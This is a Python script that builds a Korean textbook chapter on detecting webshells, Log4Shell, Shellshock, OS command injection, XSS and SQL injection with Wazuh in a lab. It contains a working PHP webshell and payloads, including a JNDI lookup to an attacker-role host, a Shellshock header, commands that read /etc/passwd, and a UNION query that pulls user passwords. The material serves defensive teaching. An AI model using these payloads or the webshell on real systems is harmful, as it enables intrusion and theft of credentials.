"""REV01 · 7장 웹 서버 침투와 실행 흔적. 저자용이며 실습 명령을 실행하지 않는다.

2026-11-06 개정 기준
- 조사 질문: 서버에서 실행되었는가. 입력 흔적 → 처리 흔적 → 서버 변화 → 실행 결과의 네 단계(도식 7-2)로
  여섯 사례를 판정한다.
- 결과 화면은 강의 슬라이드(2026-10-31 기록)에서 추출한 기존 화면만 쓴다(AGENTS.md 7장 조건). 새 공격 실행·UI 촬영·
  DQL 실서버 검증은 하지 않았다. 슬라이드 화면의 주소(.189·.202)와 REV01 일러두기 예시값이 같다.
- kt66 사실(web FIM의 /var/www 실시간 감시, cmdlog 100260, ClamAV 52502, vhost 라우팅)은 기준 커밋 소스와
  editorial/evidence/chapter07/apache-routing-reference.txt로 대조했다. 규칙 조건은 Wazuh v4.10.0 ruleset과 대조했다.
"""
import json,shutil
from pathlib import Path
ROOT=Path(__file__).resolve().parents[1]
OUT=ROOT/'manuscript/REV01'
EX=ROOT/'examples/rev01/chapter07'
COMMIT='63d4180b1d6866de986ef263a3bd831d6082b5d5'
pages=[];commands=[];queries=[]

def p(t): return {'type':'p','text':t}
def h(t): return {'type':'h','text':t}
def ul(*items): return {'type':'list','items':list(items)}
def ol(*items): return {'type':'list','style':'number','items':list(items)}
def tab(head,rows,widths=None,keep=False):
    b={'type':'table','head':head,'rows':rows,'widths':widths}
    if keep:b['keep']=True
    return b
def img(path,caption,width=127): return {'type':'image','path':path,'caption':caption,'width_mm':width}
def screen(name,caption,width=127): return img(f'assets/screens/chapter07/{name}.png',caption,width)
def box(kind,*text,items=None):
    b={'type':'box','kind':kind,'text':list(text)}
    if items:b['items']=items
    return b
def code(t): return {'type':'code','text':t}
def link(text,url): return {'type':'link','text':text,'url':url}
HOST='kt66 VM · 터미널';WEB='kt66-web 컨테이너 · 셸';SIEM='kt66-siem 컨테이너 · 셸';DVWA='kt66-dvwa 컨테이너 · 셸';ATT='공격자 VM · 터미널'
def c(text,purpose,syntax,result,where):
    b={'type':'command','id':f'C07-{len(commands)+1:02d}','where':where,'purpose':purpose,'text':text,'syntax':syntax,'result':result}
    commands.append(b);return b
def q(text,purpose,syntax,result,index='wazuh-alerts-*'):
    b={'type':'query','id':f'Q07-{len(queries)+1:02d}','where':'Windows · Discover · '+index,'purpose':purpose,'text':text,'syntax':syntax,'result':result}
    queries.append(b);return b
def page(title,*blocks,brk=True,level='page'):
    pg={'title':title,'kind':'body','blocks':list(blocks)}
    if not brk:pg['break']=False
    if level!='page':pg['level']=level
    pages.append(pg)
def section(title,*blocks):page(title,*blocks,brk=False,level='section')
FIG='assets/figures/chapter07/'
SHELL="/var/www/html/uploads/book07-shell.php"
PHP="<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}"
B07={
 'B07-01-hosts.txt':'192.168.0.189 dvwa.kt66.lab juice.kt66.lab',
 'B07-02-webshell.txt':'http://192.168.0.189/uploads/book07-shell.php?cmd=id',
 'B07-03-jndi-agent.txt':'${jndi:ldap://192.168.0.202:1389/a}',
 'B07-04-jndi-url.txt':'http://dvwa.kt66.lab/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.202%3A1389%2Fa%7D',
 'B07-05-shellshock-agent.txt':'() { :; }; /bin/bash -c "id"',
 'B07-06-shellshock-url.txt':'http://juice.kt66.lab/cgi-bin/test.cgi',
 'B07-07-command-form.txt':'127.0.0.1; id',
 'B07-08-command-juice.txt':'http://juice.kt66.lab/rest/track-order/1%3Bid',
 'B07-09-command-dvwa.txt':'http://dvwa.kt66.lab/vulnerabilities/exec/?ip=127.0.0.1%7Ccat%20/etc/passwd',
 'B07-10-xss.txt':'http://juice.kt66.lab/?q=%3Cscript%3Ealert(1)%3C/script%3E',
 'B07-11-union.txt':'http://juice.kt66.lab/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--',
 'B07-12-error.txt':'http://juice.kt66.lab/rest/products/search?q=%271'}

# ── 장 도입 ───────────────────────────────────────────────────
page('7장  웹 서버 침투와 실행 흔적',
    p('Wazuh 경보 목록에 Shellshock attack detected가 있다. 규칙 31168, 수준 15로 Wazuh 기본 규칙 중 가장 높은 등급이다. 서버에서 명령이 실행되었을까? 31168의 조건을 읽으면 접속 로그의 헤더에 Shellshock 형태의 문자열이 있고 응답 코드가 2xx·3xx라는 것이다. 이 경보가 확인해 주는 것은 공격 문자열이 들어왔고 서버가 정상 응답을 보냈다는 사실이다. 명령이 실행되었는지는 서버에서 바뀐 것, 즉 파일·명령 기록·통신에서 따로 찾아야 한다.'),
    p('다룰 사례는 여섯 가지이다. 웹셸 파일, Log4Shell 조회 문자열, Shellshock 헤더, OS 명령 삽입, 공격 요청의 200·500 응답, 반복되는 서버 오류이다. 결과 화면은 강의 자료에 수록된 2026년 10월 31일의 기록이다. 같은 입력을 직접 보내 자신의 결과와 비교하고, 보낸 요청은 공격 일지에 적는다. Module 01 실습 07~12에 해당한다.'),
    h('학습 목표'),
    ul('웹셸·Log4Shell·Shellshock·명령 삽입의 성립 조건을 설명하고, 각 입력이 남기는 기록을 접속 로그·WAF 감사·FIM에서 찾는다.',
       '경보마다 입력 흔적 → 처리 흔적 → 서버 변화 → 실행 결과의 네 단계 중 어디까지 확인되었는지 판정한다.',
       'rule.groups와 응답 코드로 경보를 나누고, 2xx 공격 요청에서 같은 시간대의 서버 변화 기록으로 피벗한다.'),
    img(FIG+'rev01-roadmap.png','도식 7-1. 7장 학습 순서.',105),
    h('준비와 완료 기준'),
    tab(['항목','내용'],[
        ['실행 위치','Windows 브라우저, kt66 VM 터미널, 공격자 VM(7.11 선택)'],
        ['선행 조건','5·6장의 DVWA 접속과 hosts 등록, Juice Shop 접속(아래)'],
        ['완료 기준','7.8의 판정 표에 여섯 사례의 도달 단계와 근거를 채운다.'],
        ['결과가 다를 때','7.10의 증상별 확인 순서를 따른다.'],
        ['원상복구','7.2의 실습 파일 삭제, User-Agent·DVWA 단계·hosts를 7.10에서 되돌린다.']],[32,95],keep=True))

# ── 7.1 ──────────────────────────────────────────────────────
section('7.1  실행 판정의 네 단계',
    p('5장에서는 입력이 어디까지 전달되었는지를 다섯 지점으로 나누었다. 이 장의 질문은 그다음, 서버에서 무엇이 실행되었는가이다. 다음 네 단계로 판정한다.'),
    img(FIG+'rev01-ladder.png','도식 7-2. 실행 판정의 네 단계와 찾을 기록.'),
    p('1·2단계는 웹 요청과 응답의 기록이다. 웹 공격 경보의 대부분이 여기에 해당한다. 3단계는 서버 안에서 생긴 변화이다. kt66-web에서는 다음 기록이 Wazuh로 들어온다. [2][3]'),
    tab(['기록','kt66-web의 위치 · Wazuh 규칙'],[
        ['DVWA·Juice 접속','/var/log/apache2/dvwa_access.log · juice_access.log'],
        ['IP 주소 접속(기본 사이트)','/var/log/apache2/landing_access.log'],
        ['WAF 감사','/var/log/apache2/modsec_audit.log (아카이브)'],
        ['파일 변화(FIM)','/var/www 실시간 감시 · 554 추가, 550 변경, 553 삭제'],
        ['로그인 셸 명령','/var/log/kt66-cmd.log · 100260(group cmdlog)'],
        ['악성코드 검사','/var/log/kt66-clamav.log · 52502(ClamAV)']],[40,87],keep=True),
    p('FIM(File Integrity Monitoring)은 지정한 경로의 파일 추가·변경·삭제를 감시해 보고하는 Wazuh 기능이다. kt66은 web 에이전트에 /var/www를 실시간(realtime)으로 감시하도록 설정한다. 같은 설정이 로그인 셸의 명령을 기록하는 cmdlog와 /var/www를 20초마다 검사하는 ClamAV 결과도 수집한다. [1]'),
    img(FIG+'collection.png','도식 7-3. 웹 요청·파일 변경과 Wazuh 수집 경로.'),
    h('준비'),
    p('실습에는 DVWA와 OWASP Juice Shop을 쓴다. Juice Shop은 kt66이 실행하는 또 하나의 취약한 웹 애플리케이션이며, kt66은 Juice Shop 앞의 WAF를 탐지 전용(DetectionOnly)으로 둔다. 차단하지 않고 기록만 하므로 공격 요청이 애플리케이션까지 전달된다.'),
    ol('Windows hosts의 DVWA 줄에 juice 이름을 더한다: 192.168.0.189 dvwa.kt66.lab juice.kt66.lab(B07-01).',
       '브라우저에서 http://juice.kt66.lab/을 열어 Juice Shop 첫 화면을 확인한다.',
       'DVWA에 로그인하고 **DVWA Security**의 현재 값을 적은 뒤 **Low**로 바꾼다. 개발자 도구 Network의 Preserve log를 켠다.'))

# ── 7.2 ──────────────────────────────────────────────────────
section('7.2  웹셸 파일',
    p('웹셸은 웹 요청으로 서버의 운영체제 명령을 실행하게 만든 스크립트이다. 업로드 취약점 등으로 실행 가능한 웹 경로에 저장되면 공격자가 URL만으로 서버를 조작할 수 있다. 실습에서는 관리자가 kt66-web 안에 PHP 파일을 직접 만들어 웹셸이 놓인 상태를 재현한다. HTTP 업로드 과정은 다루지 않는다.'),
    img(FIG+'webshell.png','도식 7-4. 파일 생성과 요청·실행 증거의 연결.'),
    c('docker exec -it kt66-web /bin/bash',
      'kt66-web 컨테이너의 셸로 들어간다.',
      '5.4와 같은 명령이다.',
      '프롬프트가 kt66-web 안으로 바뀐다.',HOST),
    c(f"grep -n -F '/var/www' /var/ossec/etc/ossec.conf\nls -ld /var/www/html/uploads\nls -l {SHELL}",
      '(사전 확인) FIM 감시 경로, 업로드 폴더, 실습 파일의 현재 상태를 확인한다.',
      'grep -n -F는 /var/www를 글자 그대로 찾고 줄 번호를 붙인다. ls -ld는 폴더 안의 목록 대신 폴더 자체의 정보를 보인다.',
      '첫 명령에서 realtime="yes"가 붙은 /var/www 감시 줄이 나온다. 폴더가 없으면 mkdir -p /var/www/html/uploads로 만들고 원상복구 때 지울 수 있도록 적어 둔다. 실습 파일은 No such file or directory여야 한다. 이미 있으면 다른 파일 이름을 정한다.',WEB),
    c(f'vim {SHELL}',
      '웹셸 코드를 파일로 저장한다.',
      'vim은 kt66-web에 설치된 터미널 편집기이다. i를 눌러 입력 모드로 바꾸고 아래 코드를 입력한 뒤 Esc, :wq, Enter로 저장하고 닫는다. 저장하지 않고 나갈 때는 Esc, :q!, Enter이다.',
      '편집기가 닫히고 프롬프트로 돌아온다. 복사용 코드는 examples/rev01/chapter07/P07-webshell.php이다.',WEB),
    code(PHP),
    p('$_GET은 URL 쿼리의 값을 읽는 PHP 변수이고, isset은 cmd 값이 있는지 확인한다. system은 받은 문자열을 운영체제 명령으로 실행하고 출력을 그대로 응답에 넣는다.'),
    c(f'cat {SHELL}\nexit',
      '(사후 확인) 저장된 내용을 확인하고 컨테이너에서 나온다.',
      'cat은 파일 내용을 출력한다.',
      '위 코드와 같고, $_GET과 작은따옴표가 그대로 있다.',WEB),
    p('브라우저에서 http://192.168.0.189/uploads/book07-shell.php?cmd=id를 한 번 요청하고(B07-02) Status Code와 Response를 공격 일지에 적는다. id는 실행 계정의 식별자를 출력하는 명령이다.'),
    screen('file-response','화면 7-1. shell.php 요청의 404 응답 본문.',100),
    p('강의 자료의 같은 요청은 404였다. IP 주소로 요청하면 Apache는 기본 사이트(landing)를 고르고, 그 문서 루트는 /var/www/landing이다. 파일을 만든 /var/www/html과 다르므로 URL이 파일에 닿지 않았다. 판정은 1단계(요청)와 3단계(파일 추가)는 있고 4단계(실행 결과)는 없다. [1]'),
    q('agent.name: "web" AND rule.id: "554"\nAND syscheck.path: *shell.php',
      '웹 경로에 PHP 파일이 추가된 FIM 경보를 찾는다.',
      '554는 File added to the system 규칙이다. syscheck.path는 FIM이 관찰한 파일의 전체 경로이다.',
      '강의 자료에서는 /var/www/html/uploads/shell.php의 추가가 19:14:05.794에 기록되었다. 자신의 실습 파일 경로와 시각을 적는다.'),
    screen('fim-path','화면 7-2. FIM에 기록된 PHP 파일 경로.',100),
    q('agent.name: "web" AND data.url: *shell.php*',
      '같은 파일 이름을 요청한 접속 기록을 찾는다.',
      'FIM 경로의 파일 이름을 접속 로그의 URL 조건으로 옮겨 피벗한다.',
      'FIM 시각 뒤의 요청과 응답 코드를 읽는다. 경보 인덱스에 없으면 wazuh-archives-*에서 같은 조건으로 찾는다.'),
    box('blind','FIM 경보에는 누가 파일을 만들었는지가 없다. kt66의 cmdlog(규칙 100260)는 web에 로그인한 대화형 셸의 명령을 기록하지만, docker exec로 연 셸은 로그인 셸이 아니어서 기록되지 않을 수 있다. 같은 시각에 rule.groups: "cmdlog" 기록이 있는지 확인하고, 없으면 작성 주체는 컨테이너 관리 기록과 배포·업로드 기록에서 찾는다. 같은 시각의 ClamAV 52502가 없다는 것은 그 파일이 시그니처에 없었다는 뜻이다.'),
    h('원상복구'),
    c('docker exec -it kt66-web /bin/bash',
      'kt66-web 컨테이너의 셸로 들어간다.',
      'C07-01과 같다.',
      '프롬프트가 kt66-web 안으로 바뀐다.',HOST),
    c(f'cat {SHELL}\nrm -i {SHELL}\nls -l {SHELL}',
      '실습 파일인지 확인하고 지운 뒤 지워졌는지 확인한다.',
      'rm -i는 지우기 전에 확인을 묻는다. 경로가 맞으면 y를 입력한다.',
      '마지막 ls -l이 No such file or directory를 출력한다. uploads 폴더를 새로 만들었다면 ls -la로 비어 있는지 보고 rmdir /var/www/html/uploads로 지운다.',WEB),
    c('exit',
      'kt66-web 셸에서 나온다.',
      'exit는 현재 셸을 끝낸다.',
      'kt66 VM의 프롬프트로 돌아온다.',WEB),
    p('Discover에서 rule.id: "553"(File deleted.)과 실습 파일 경로로 삭제 기록을 확인한다. 추가(554)와 삭제(553)가 짝으로 남는다.'))

# ── 7.3 ──────────────────────────────────────────────────────
section('7.3  Log4Shell 조회 문자열',
    p('Log4Shell(CVE-2021-44228)은 Java 로그 라이브러리 Log4j 2가 로그로 남길 문자열 안의 조회 표현식을 해석하다 외부 서버의 코드를 불러와 실행할 수 있었던 취약점이다. JNDI는 Java에서 이름으로 자원을 조회하는 인터페이스이고, LDAP는 디렉터리 조회 프로토콜이다. [4]'),
    code('${jndi:ldap://192.168.0.202:1389/a}'),
    p('${…}는 조회 표현식이고 ldap:// 뒤는 조회할 서버(192.168.0.202의 1389 포트)와 자원 이름(a)이다. 취약한 Log4j가 이 문자열을 로그로 남기면 그 주소로 LDAP 조회를 보낸다. 요청을 보낸 출발지와 조회 목적지는 역할이 다르며 다른 주소일 수 있다.'),
    img(FIG+'log4shell.png','도식 7-5. 입력 문자열의 처리와 외부 조회.'),
    ol('Network conditions의 User-Agent를 위 문자열로 바꾼다(B07-03, 6.3과 같은 방법).',
       'http://dvwa.kt66.lab/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.202%3A1389%2Fa%7D를 한 번 요청한다(B07-04). %24는 $, %7B·%7D는 중괄호, %3A는 :, %2F는 /이다.',
       'Request Headers의 User-Agent와 Request URL의 q 값, Status Code를 공격 일지에 적고 **Use browser default**를 다시 켠다.'),
    screen('log4-raw','화면 7-3. URL과 User-Agent의 JNDI 문자열.'),
    q('agent.name: "web"\nAND (full_log: *jndi* OR data.url: *jndi*)',
      '원문 또는 URL에 jndi가 들어간 요청을 찾는다.',
      'User-Agent는 별도 필드가 없으므로 full_log에서 찾는다. 괄호로 OR를 묶어 agent.name 조건이 양쪽에 적용되게 한다.',
      '강의 자료에서는 403, 규칙 31101이었다. 같은 요청의 WAF 감사 기록(5.6의 방법)에서 차단 메시지를 확인한다.'),
    p('공격자는 탐지를 피하려고 ${${lower:j}ndi:…}처럼 글자를 쪼갠다. 안쪽 ${lower:j}가 j로 해석되어 바깥에서 jndi가 완성되므로, 원문에는 연속된 jndi가 없다.'),
    q('agent.name: "web"\nAND (full_log: *jndi* OR full_log: *lower*\nOR data.url: *%24%7B*)',
      '쪼갠 형태와 인코딩된 ${까지 후보를 넓힌다.',
      'wazuh-archives-*에서 찾는다. 후보 검색이므로 정상 문자열도 섞일 수 있다. 원문을 펼쳐 전체 표현식을 읽는다.',
      '강의 자료의 변형 요청(X-Api-Version 헤더에 ${${lower:j}ndi:…}, User-Agent에 rmi 조회)은 302였다.',index='wazuh-archives-*'),
    box('blind','Apache의 combined 접속 로그는 User-Agent와 Referer만 기록하고 X-Api-Version 같은 다른 헤더는 기록하지 않는다. 그 헤더에 들어간 조회 문자열은 접속 로그와 경보에 나타나지 않는다. WAF 감사 기록에 요청 헤더가 저장되었는지 확인한다. [2]'),
    tab(['단계','이 사례에서 확인할 것'],[
        ['1 입력','URL·User-Agent·감사 기록의 조회 문자열과 목적지'],
        ['2 처리','403(차단)·302(이동)와 응답 본문'],
        ['3 변화','DVWA는 PHP 애플리케이션이다. Java·Log4j를 쓰는 서비스인지부터 확인한다.'],
        ['4 결과','서버가 192.168.0.202:1389로 통신했는지(방화벽·DNS 기록), 이후 Java 하위 프로세스·새 파일']],[20,107],keep=True),
    p('대응은 영향받는 Log4j를 수정 버전으로 업데이트하는 것이 우선이다. 업무에 필요 없는 외부 LDAP·RMI 통신을 막고, 이미 발생한 조회 기록을 보존한다. [4]'))

# ── 7.4 ──────────────────────────────────────────────────────
section('7.4  Shellshock 헤더',
    p('Shellshock(CVE-2014-6271)은 취약한 Bash가 환경변수에 든 함수 정의를 읽을 때 그 뒤에 붙은 명령까지 실행하던 취약점이다. CGI 방식의 웹 프로그램은 User-Agent 같은 요청 헤더를 HTTP_USER_AGENT 같은 환경변수로 넘기므로, CGI가 Bash를 호출하면 헤더의 명령이 실행될 수 있다. 외부 헤더 전달, Bash 호출, 취약한 Bash 세 조건이 모두 필요하다. [5]'),
    img(FIG+'shellshock.png','도식 7-6. 헤더·CGI 환경변수·Bash의 연결.'),
    code('() { :; }; /bin/bash -c "id"'),
    p('()와 { }는 함수 정의 형태이고, 콜론(:)은 아무것도 하지 않는 명령, 세미콜론(;)은 명령 구분자이다. 함수 정의 뒤의 /bin/bash -c "id"가 실행을 노린 명령이다.'),
    p('User-Agent를 위 값으로 바꾸고(B07-05) http://juice.kt66.lab/cgi-bin/test.cgi를 한 번 요청한다(B07-06). 응답 코드와 본문을 공격 일지에 적은 뒤 User-Agent를 되돌린다.'),
    screen('shell-rules','화면 7-4. Shellshock 형태의 요청에 적용된 두 규칙.'),
    screen('shell-raw','화면 7-5. User-Agent와 Referer에 기록된 공격 구문.'),
    p('강의 자료의 두 요청이다. 위는 /cgi-bin/test.cgi에 대한 200과 규칙 31168, 아래는 /cgi-bin/status에 대한 403과 규칙 31166이다. 아래 요청은 Referer 헤더에 /bin/bash -c "cat /etc/passwd"를 넣었다(7.11의 C07-19).'),
    q('agent.name: "web"\nAND rule.id: ("31166" OR "31167" OR "31168" OR "31169")',
      'Shellshock 형태의 요청 경보를 모두 찾는다.',
      '값 자리의 괄호와 OR로 네 규칙 번호 중 하나를 고른다.',
      '각 행의 data.id와 rule.id를 짝지어 읽는다.'),
    tab(['규칙','상위 규칙의 조건','수준·설명'],[
        ['31166·31167','31101(4xx) 또는 31120(50x) + 헤더 구문','6 · attempt'],
        ['31168·31169','31108(2xx·3xx) + 헤더 구문','15 · detected']],[30,62,35],keep=True),
    p('같은 문자열이 응답 코드에 따라 attempt(시도)와 detected(탐지)로 나뉜다. detected의 근거는 서버가 2xx·3xx로 응답했다는 것이다. 도식 7-2로 보면 2단계까지이다. Juice Shop은 Node.js 애플리케이션이고, 없는 경로도 첫 화면을 200으로 돌려준다. 응답 본문이 일반 페이지이면 CGI·Bash가 호출되지 않은 것이다. [6]'),
    box('field','Shellshock 31168은 수준 15라서 경보 목록 맨 위에 온다. 실제 위험은 그 서버에 CGI가 있는지, Bash가 취약한 버전인지로 정해진다. 수준이 높은 경보일수록 응답 본문과 3단계 기록을 먼저 확인해 빨리 판정한다.'))

# ── 7.5 ──────────────────────────────────────────────────────
section('7.5  OS 명령 삽입',
    p('OS 명령 삽입은 웹 입력이 셸 명령의 일부로 해석되어 의도하지 않은 명령이 실행되는 취약점이다. DVWA의 **Command Injection**은 입력한 주소로 ping을 실행하는데, Low 단계 코드는 입력을 ping 명령 문자열 뒤에 그대로 붙인다.'),
    img(FIG+'command-input.png','도식 7-7. 웹 입력과 운영체제 명령 처리.'),
    tab(['셸 기호','동작'],[
        ['세미콜론(;)','앞 명령 뒤에 다음 명령을 실행한다.'],
        ['파이프(|)','앞 명령의 출력을 다음 명령의 입력으로 보낸다.'],
        ['&& · ||','앞 명령이 성공하면 · 실패하면 다음을 실행한다.'],
        ['$(명령)','명령의 출력으로 그 자리를 바꾼다.']],[30,97],keep=True),
    ol('**Command Injection**에서 127.0.0.1을 넣고 Submit을 눌러 정상 ping 출력을 본다.',
       '입력을 127.0.0.1; id로 바꾸고(B07-07) Submit을 한 번 누른다. Network에서 POST 요청의 Payload(ip, Submit)와 응답을 확인한다.',
       '주소창에 Juice Shop 주문 추적 경로 http://juice.kt66.lab/rest/track-order/1%3Bid를 한 번 요청한다(B07-08). %3B는 세미콜론이다.',
       'DVWA 경로에 GET으로 파이프를 넣는다: http://dvwa.kt66.lab/vulnerabilities/exec/?ip=127.0.0.1%7Ccat%20/etc/passwd(B07-09). %7C는 파이프, %20은 공백이다.'),
    p('응답에 uid=…·gid=… 같은 출력이 나오면 id 명령이 실행된 4단계 근거이다. 강의 자료의 기록은 Juice GET 200, DVWA GET 403, 인증 없는 curl POST 302였다. DVWA Low 코드는 POST의 Submit 값이 있어야 명령을 만들므로 주소창의 GET은 명령을 실행하지 않는다.'),
    screen('exec-url','화면 7-6. ip 쿼리에 포함된 파이프와 파일 경로.'),
    q('agent.name: "web"\nAND data.url: (*vulnerabilities/exec/* OR *track-order*)',
      '두 기능의 요청을 경로로 먼저 모은다.',
      '공격 문자열보다 경로로 넓게 찾아 정상 요청·POST도 함께 비교한다. 정상 POST는 경보가 아니므로 wazuh-archives-*에서도 찾는다.',
      '요청마다 메서드·응답 코드·시각을 적는다.'),
    q('agent.name: "web" AND data.url:\n(*%3Bid* OR *;id* OR *%7Ccat* OR *cat%20*\nOR *whoami* OR *%24%28*)',
      'URL에 명령 문자열이 붙은 요청 후보를 찾는다.',
      '%24%28은 $(이다. 기호 하나보다 명령 이름과 함께 찾는다.',
      '후보를 고르는 식이다. 다른 인코딩과 POST 본문의 값은 이 식으로 찾을 수 없다.'),
    box('blind','브라우저 폼의 POST 요청은 접속 로그에 POST와 경로만 남고 ip=127.0.0.1; id 같은 본문은 남지 않는다. 가장 위험한 실제 실행 경로(로그인한 POST)가 URL 검색에는 보이지 않는다. 본문은 WAF 감사 기록의 저장 범위와 브라우저 Network의 Payload로 확인한다.'),
    p('대응은 셸 호출 대신 해당 작업을 하는 라이브러리 함수를 쓰는 것이 우선이다. 셸 실행이 꼭 필요하면 인자를 분리하고 허용값을 검사하며, 실행 계정의 권한을 줄인다. [7]'))

# ── 7.6 ──────────────────────────────────────────────────────
section('7.6  공격 요청의 200과 500',
    p('Juice Shop 앞의 WAF는 탐지 전용이라 공격 요청이 애플리케이션까지 간다. 두 요청의 응답을 비교한다.'),
    img(FIG+'response.png','도식 7-8. HTTP 응답과 실제 처리 결과의 대조.'),
    ol('http://juice.kt66.lab/?q=%3Cscript%3Ealert(1)%3C/script%3E를 요청한다(B07-10). 응답 코드와 알림 창이 열렸는지를 따로 적는다.',
       '상품 검색 API에 UNION 구문을 보낸다(B07-11). q 값의 %27))는 원래 SQL의 문자열과 괄호를 닫고, UNION SELECT id,email,password,4,…,9 FROM Users--가 사용자 표를 덧붙이려 한다.'),
    screen('ok-rule','화면 7-7. 의심 URL의 규칙 31106.'),
    screen('union-response','화면 7-8. UNION SELECT 요청의 HTTP 500.',100),
    tab(['요청','강의 자료의 결과','판정'],[
        ['XSS 형태 URL','200 · 31106','2단계. 응답 HTML에 script가 실행 위치로 들어갔는지, 알림 창이 열렸는지가 4단계 근거'],
        ['UNION SELECT','500','2단계. 사용자 표가 응답에 돌아왔다는 근거는 없다.']],[28,30,69],keep=True),
    p('31106(A web attack returned code 200 (success).)은 웹 공격 규칙(31103·31104·31105)과 응답 200이 함께 일치하면 붙는다. 500은 애플리케이션이 그 입력을 처리하다 오류를 냈다는 뜻이다. “WAF를 통과했다”와 “목표한 처리가 성공했다”를 따로 적는다. [6]'),
    q('agent.name: "web"\nAND (rule.id: "31106"\nOR (rule.groups: "attack" AND data.id: 2*))',
      '응답이 2xx인 공격 요청을 우선 조사 목록으로 모은다.',
      '바깥 괄호 안에서 31106, 또는 attack 그룹이면서 data.id가 2로 시작하는 기록을 고른다. data.id는 문자열이므로 2*로 쓴다.',
      '출발지·URL·시각을 적고 7.8의 방법으로 같은 시간대의 서버 변화 기록을 찾는다.'))

# ── 7.7 ──────────────────────────────────────────────────────
section('7.7  반복되는 서버 오류',
    p('5xx는 서버가 요청을 처리하다 실패한 응답이다. 공격 입력 외에 DB 연결 실패, 잘못된 배포, 자원 부족도 원인이 된다. 퍼징(입력을 바꾸며 비정상 동작을 찾는 시험)은 짧은 시간에 5xx를 쏟아낸다.'),
    p('http://juice.kt66.lab/rest/products/search?q=apple로 정상 응답을 먼저 본다. 이어 q=%271을 요청하고(B07-12) 끝 숫자를 2, 3, …, 20까지 바꾸며 시각과 응답 코드를 적는다. 응답이 늦어지거나 정상 접속이 실패하면 멈춘다.'),
    screen('error-series-a','화면 7-9. 반복 요청의 HTTP 500 응답(앞 10개).',100),
    q('agent.name: "web" AND data.id: 5*',
      '응답이 5로 시작하는 기록을 찾는다.',
      'data.id는 HTTP 응답 코드이다. rule.id와 별개로 응답 코드만으로 고른다.',
      'data.url·data.srcip·rule.id 열을 추가하고 위쪽 히스토그램에서 시간 분포를 읽는다.'),
    screen('error-rule','화면 7-10. 500 응답 요청의 SQL 인젝션 규칙.'),
    p('강의 자료의 500 기록 중 UNION 요청은 rule.id가 31103(SQL injection attempt.)이었다. 응답 코드가 500이어도 URL에 공격 문자열이 있으면 SQL 인젝션 규칙이 먼저 붙는다. 터미널에 찍힌 500 스무 개와 Discover의 경보 수가 다른 이유이다.'),
    h('시간 분포와 비율'),
    ol('히스토그램 위의 간격 표시(Auto)를 **Minute**로 바꾸고 막대가 솟은 구간을 끌어 선택한다. 기간이 그 구간으로 좁혀진다.',
       '같은 길이의 직전 구간으로 기간을 옮겨 건수를 비교한다.',
       '전체 요청 대비 오류 비율이 필요하면 경보 인덱스가 아니라 아카이브(또는 원본 접속 로그)로 분자·분모를 같은 기록 종류에서 센다.'),
    tab(['계산 예시 · 1분','직전 구간','조사 구간'],[['전체 접속 기록','200','400'],['5xx 접속 기록','2','40'],['5xx 비율','1%','10%']],[45,41,41],keep=True),
    p('위 표는 계산 방법을 보이는 예시이다. 경보 인덱스의 건수는 전체 요청 수가 아니고, 같은 요청이 접속 로그와 감사 기록에 각각 남으면 문서가 중복될 수 있다.'),
    q('agent.name: "web"\nAND rule.id: ("31161" OR "31162" OR "31163")',
      '같은 출발지의 5xx 반복 경보를 찾는다.',
      '31161·31162·31163은 501·500·503 개별 규칙(31121·31122·31123)이 같은 출발지에서 120초 안에 반복되면 붙는다(frequency 14).',
      '31103으로 분류된 500은 31122가 아니므로 이 반복 조건에 들어가지 않는다. 공격 문자열이 든 500이 많아도 31162가 없을 수 있다.'),
    p('대응은 오류와 서비스 영향을 함께 보는 데서 시작한다. 공격 입력이 집중되면 해당 기능·출발지를 제한하고 앱·DB 오류와 자원 상태를 보존한다. 배포·연결 장애라면 원인 변경을 되돌린 뒤 오류율 회복을 확인한다.'))

# ── 7.8 ──────────────────────────────────────────────────────
section('7.8  교차 분석: 경보에서 서버 변화로',
    p('여섯 사례를 따로 보았다. 실제 조사에서는 사례 이름 없이 경보 목록에서 출발한다. 웹 경보를 판정 단계별로 나누고, 실행 가능성이 있는 것부터 서버 변화 기록으로 피벗한다.'),
    h('1. 그룹으로 나누기'),
    p('Wazuh 규칙은 rule.groups에 분류 이름을 가진다. 웹 공격 규칙은 attack, 경로 탐색 반복은 web_scan, FIM은 syscheck, ClamAV는 virus, kt66 명령 기록은 cmdlog이다. 실습 시간 전체를 지정하고 agent.name: "web"으로 검색한 뒤 필드 목록에서 rule.groups의 상위 값을 연다(6.6). 1·2단계 기록(attack·web_scan)과 3단계 기록(syscheck·virus·cmdlog)의 건수가 한눈에 나뉜다.'),
    q('agent.name: "web"\nAND rule.groups: ("syscheck" OR "virus" OR "cmdlog")',
      '서버 안의 변화 기록(3단계)만 모은다.',
      '세 그룹 중 하나에 속한 경보를 고른다.',
      'FIM 추가·변경·삭제, 악성코드 검사, 셸 명령 기록이 시간순으로 나온다. 웹 공격 경보가 많아도 이 결과가 비어 있으면 서버 변화의 근거는 아직 없다.'),
    h('2. 2xx 공격 요청에서 피벗'),
    p('7.6의 Q07-08로 2xx 공격 요청을 모은다. 한 건을 골라 출발지와 시각을 적고, 기간을 그 시각의 앞뒤 5분으로 좁힌 뒤 다음을 차례로 본다.'),
    ol('같은 출발지의 다른 요청: data.srcip 조건으로 시간순 정렬(6.7).',
       '같은 시간대의 서버 변화: 위의 3단계 그룹 검색. 웹 경로(/var/www)에 새 파일이 생겼는지 syscheck.path를 본다.',
       '파일이 있으면 그 이름을 data.url로 피벗해 그 파일을 요청한 기록과 응답 코드를 찾는다(7.2의 Q07-02).',
       '응답 본문과 명령 출력(4단계)은 브라우저 Network의 Response나 서버의 애플리케이션 기록에서 확인한다.'),
    h('3. 판정 표'),
    p('강의 자료의 기록으로 채운 예이다. 자신의 결과로 같은 표를 만든다.'),
    tab(['사례','1 입력','2 처리','3 변화','4 결과'],[
        ['웹셸','URL 요청','404','FIM 554','없음'],
        ['Log4Shell','JNDI 문자열','403 · 302','미확인','미확인'],
        ['Shellshock','헤더 구문','200(31168) · 403','미확인','미확인'],
        ['명령 삽입',';id · |cat','200 · 403 · 302','미확인','미확인'],
        ['XSS·UNION','script · UNION','200(31106) · 500','-','미확인'],
        ['반복 오류','q=%27n','500 ×20','-','-']],[25,27,33,21,21],keep=True),
